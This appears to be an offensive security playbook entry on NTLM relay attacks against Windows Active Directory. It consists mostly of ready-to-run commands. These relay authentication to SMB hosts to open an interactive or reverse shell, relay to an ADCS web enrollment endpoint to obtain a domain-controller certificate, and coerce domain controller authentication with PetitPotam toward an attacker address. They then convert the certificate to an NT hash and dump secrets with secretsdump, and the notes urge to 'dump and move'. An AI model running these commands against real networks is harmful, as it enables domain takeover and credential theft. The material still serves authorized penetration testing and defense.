---
id: ntlm-relay
title: NTLM Relay
stage: initial-access
tags: [windows, ad, smb]
tools:
  - impacket-ntlmrelayx -tf targets.txt -smb2support
  - impacket-ntlmrelayx -tf targets.txt -smb2support -i
  - impacket-ntlmrelayx -t http://$DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
leads_to:
  - rev-shell
  - pass-the-hash
  - domain-admin
---

## Relay to SMB

```bash
# Interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
nc 127.0.0.1 11000   # connect to the interactive shell

# Execute command directly
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <base64_reverse_shell>"
```

## Relay to ADCS (ESC8)

```bash
# Requires: Web Enrollment enabled on CA
impacket-ntlmrelayx -t http://$DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Then coerce DC auth:
python3 PetitPotam.py $ATTACKER_IP $DC_IP

# Convert cert → NT hash
certipy auth -pfx dc.pfx -dc-ip $DC_IP
```

## After Relay Success

```bash
# If relayed user is local admin → dump immediately
impacket-secretsdump $DOMAIN/user@$TARGET -hashes :NTLM_HASH
```

## Notes

Relay hits give you the credentials of whatever user's traffic you intercepted. If that's a domain admin or local admin — dump and move. Combine with coercion (PetitPotam/PrinterBug) to force specific machine accounts to authenticate.
